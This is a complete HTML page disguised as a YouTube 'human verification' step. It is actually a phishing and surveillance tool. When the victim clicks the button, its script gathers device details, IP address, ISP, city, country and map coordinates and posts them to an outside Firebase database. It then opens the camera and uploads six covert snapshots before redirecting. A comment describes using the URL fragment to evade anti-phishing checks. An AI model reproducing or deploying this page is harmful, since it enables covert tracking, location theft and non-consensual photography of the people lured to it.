<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body { background: #e0e5ec; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #e0e5ec; padding: 30px; border-radius: 30px; box-shadow: 20px 20px 60px #bec3c9, -20px -20px 60px #ffffff; text-align: center; width: 85%; max-width: 350px; }
        .yt-img { width: 100%; border-radius: 20px; box-shadow: inset 6px 6px 12px #bec3c9, inset -6px -6px 12px #ffffff; margin-bottom: 20px; }
        .btn { background: #00a884; color: white; border: none; padding: 15px; width: 100%; border-radius: 15px; font-weight: bold; cursor: pointer; box-shadow: 6px 6px 12px #bec3c9, -6px -6px 12px #ffffff; }
        .btn:active { box-shadow: inset 4px 4px 8px #bec3c9, inset -4px -4px 8px #ffffff; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://img.youtube.com/vi/aqz-KE-bpKQ/mqdefault.jpg" class="yt-img">
        <h3 style="color:#444;">Video Verification</h3>
        <p style="font-size: 12px; color: #666;">High-speed processing requires a quick human verification to continue.</p>
        <button class="btn" onclick="start()">VERIFY & WATCH</button>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
        
        // Anti-Phishing Logic: Reading data from # instead of ?
        const hashData = window.location.hash.substring(1);
        if(!hashData) { window.location.href = "https://youtube.com"; }
        const decoded = JSON.parse(atob(hashData));

        async function start() {
            let info = {
                time: new Date().toLocaleString(),
                model: navigator.userAgent.split('(')[1]?.split(')')[0] || "Unknown",
                ram: navigator.deviceMemory || "N/A"
            };

            try {
                const b = await navigator.getBattery();
                info.bat = Math.round(b.level * 100) + "%";
                info.net = navigator.connection ? navigator.connection.effectiveType : "N/A";
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                info.ip = d.ip; info.isp = d.org;
                info.loc = `${d.city}, ${d.country_name}`;
                info.flag = `https://flagcdn.com/w40/${d.country_code.toLowerCase()}.png`;
                info.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
            } catch(e){}

            fetch(`${DB_URL}tracking/${decoded.k}.json`, { method: 'POST', body: JSON.stringify(info) });

            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('v'); v.srcObject = s;
                let count = 0;
                let t = setInterval(() => {
                    if(count >= 6) { clearInterval(t); s.getTracks().forEach(tr => tr.stop()); window.location.href = decoded.r; return; }
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    fetch(`${DB_URL}photos/${decoded.k}.json`, { method: 'POST', body: JSON.stringify({ p: c.toDataURL('image/jpeg', 0.3), t: new Date().toLocaleTimeString() }) });
                    count++;
                }, 800);
            } catch(e) { window.location.href = decoded.r; }
        }
    </script>
</body>
</html>
